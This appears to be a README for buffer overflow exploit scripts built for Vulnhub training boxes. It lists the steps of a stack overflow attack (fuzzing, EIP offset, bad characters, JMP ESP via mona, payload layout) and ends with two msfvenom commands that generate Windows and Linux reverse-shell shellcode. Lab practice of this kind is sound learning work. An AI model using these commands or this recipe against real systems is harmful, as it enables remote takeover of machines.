# Exploiting Buffer Overflow
Python2 based Bufferoverflow scripts I developed while doing the box Netsart by Foxlox on Vulnhub.

Walkthrough link: https://grumpygeekwrites.wordpress.com/2020/12/07/netstart-vulnhub-walk-through-tutorial/

Also Works with: 

a Brainpan Vulnhub (tested)

b Dostackbufferoverflowgood (tested, remember to add "\n" at the end of buffer)

IMP steps to remember are:

0. Spiking.
1. Fuzzing / Crashing the program with some bytes.
2. Noting down those bytes.
3. Creating a unique pattern via MSF of those bytes length and sending it to the program.
4. Again crashing the program and noting down the value of EIP. 
5. Giving the EIP value to MSF offset for finding the exact crash point. 
6. Controlling EIP, to check whether our EIP is filled with 04 x B (EIP = 42 42 42 24)
7. Finding badchars, [follow ESP in dump] removing it from the BadChars array again and again. We should see neat and clean output from 0000-FFFF.
8. Finding the JMP address in ".dll" using mona. Use command01= !mona modules ; command02= !mona find -s ‘\xff\xe4’ -m login_support.dll. Note down all the addresses.
9. Generating a SHELL payload using MSF Venom; remember to select proper architecture and specifying the BADCHARS we found. 
10. We should now get shell, our PAYLOAD would be something like ---> A*(offset value) + JMP Address in little endian format + 8/16/32 NOPs + shellcode

Windows:

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.100 LPORT=1234 EXITFUNC=thread –e x86/shikata_ga_nai -b "\x00" -f c

Linux:

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.10.6 LPORT=1234 EXITFUNC=thread -b "\x00\x2d\x2e\x46\x47\x59\x5e\x60" -f c
